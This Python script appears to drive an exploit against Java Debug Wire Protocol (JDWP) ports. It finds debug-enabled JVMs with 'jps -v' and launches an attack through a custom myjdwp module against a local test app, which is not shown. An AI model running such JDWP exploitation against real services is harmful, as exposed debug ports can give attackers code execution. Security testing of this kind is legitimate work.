import re
import sys
import subprocess
import time
import traceback
import myjdwp

def get_jvmprocess_using_jdwp():
	while True:
		proc = subprocess.Popen('jps -v', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
		buf = []

		while True:
			line = proc.stdout.readline()
			buf.append(line.decode())
			if not line and proc.poll() is not None:
				break

		outmsg = ''.join(buf)
		msgs = outmsg.split('\n')
		for msg in msgs:
			if 'jdwp' in msg:
				print(msg)
				addr = re.findall('address=([^\\s]+)', msg)[0].split(':')
				return (addr[0],addr[1])
		time.sleep(1)



if __name__ == '__main__':
	#target, port = get_jvmprocess_using_jdwp()
	target, port = ("127.0.0.1",60323)#http://:60323/
	classname, meth = myjdwp.convert_to_jdwp_format('TestApp.startAsync')
	try:
		with myjdwp.JDWPClient(target, port) as cli:
			#if not cli.runSimple():
			#	print("[-] Exploit failed")
			if not cli.runOriginal():
				print("[-] Exploit failed")
	except KeyboardInterrupt:
		print("[+] Exiting on user's request")
	except Exception:
		print("[x] An unexpected exception occurred during execution:")
		traceback.print_exc()
			